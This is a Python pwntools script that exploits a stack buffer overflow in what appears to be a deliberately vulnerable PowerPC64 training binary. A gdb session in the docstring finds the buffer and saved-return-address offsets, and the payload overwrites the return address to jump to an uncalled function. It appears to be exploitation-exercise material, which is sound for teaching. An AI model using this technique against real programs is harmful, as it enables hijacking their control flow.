#!/usr/bin/python

"""
(gdb) disassemble vulnerable 
Dump of assembler code for function vulnerable:
   0x000000001000082c <+0>:	mflr    r0
   0x0000000010000830 <+4>:	std     r0,16(r1)
...
   0x000000001000088c <+96>:	ld      r0,16(r1)
   0x0000000010000890 <+100>:	mtlr    r0
   0x0000000010000894 <+104>:	ld      r31,-8(r1)
   0x0000000010000898 <+108>:	blr
   0x000000001000089c <+112>:	.long 0x0
   0x00000000100008a0 <+116>:	.long 0x1
   0x00000000100008a4 <+120>:	lwz     r0,1(r1)
End of assembler dump.
(gdb) b vulnerable 
Breakpoint 1 at 0x10000840: file src/02-overwrite-ret.c, line 11.
(gdb) b *0x000000001000088c
Breakpoint 2 at 0x1000088c: file src/02-overwrite-ret.c, line 16.
(gdb) c
Continuing.

Breakpoint 1, vulnerable () at src/02-overwrite-ret.c:11
11		printf("> ");
(gdb) p &buffer[0]
$1 = 0x40007ff940 ""
(gdb) c
Continuing.

Breakpoint 2, 0x000000001000088c in vulnerable () at src/02-overwrite-ret.c:16
16	}
(gdb) p/x $r1+16
$2 = 0x40007ff9e0
(gdb) p not_called
$3 = {void ()} 0x100007d4 <not_called>
"""

import struct
import sys

from pwn import *

context(arch='powerpc64', os='linux', endian='big', word_size=64)

binary_path = './bin/ppc64/02-overwrite-ret'

saved_pc_addr = 0x40007ff9e0
buffer_addr = 0x40007ff940
not_called_addr = 0x100007d4

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (saved_pc_addr - buffer_addr)
payload += p64(not_called_addr)

p.readuntil('> ')
p.write(payload)
p.interactive()
